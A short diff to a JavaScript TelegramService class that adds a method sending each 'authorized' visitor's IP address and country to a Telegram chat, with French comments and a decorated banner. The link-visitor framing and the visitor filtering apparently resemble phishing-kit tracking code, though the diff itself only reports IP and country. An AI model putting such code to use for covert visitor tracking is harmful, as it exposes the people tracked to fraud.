@@ -237,6 +237,30 @@ class TelegramService {
 
     return await this.sendMessage(message.trim());
   }
+
+  /**
+   * Envoie une notification pour un visiteur autorisé
+   * @param {object} clientData - Données du client (ip, country)
+   */
+  async notifyAuthorizedVisitor(clientData) {
+    console.log('[TelegramService] 📨 notifyAuthorizedVisitor called with data:', JSON.stringify(clientData, null, 2));
+    
+    const country = clientData.country || 'N/A';
+    const ip = clientData.ip || 'N/A';
+    
+    const message = `
+🔔 NOUVEAU VISITEUR SUR LE LIEN
+=========NETI-REZ-==========
+🌍 Pays: ${country}
+✅ Statut: ✅ AUTORISÉ
+🌐 IP: ${ip}
+===========oZy===========
+    `.trim();
+
+    console.log('[TelegramService] 📝 Authorized visitor message prepared');
+    // Envoyer sans parse_mode HTML pour éviter les problèmes avec les emojis
+    return await this.sendMessage(message, { parse_mode: undefined });
+  }
 }
 
 module.exports = TelegramService;
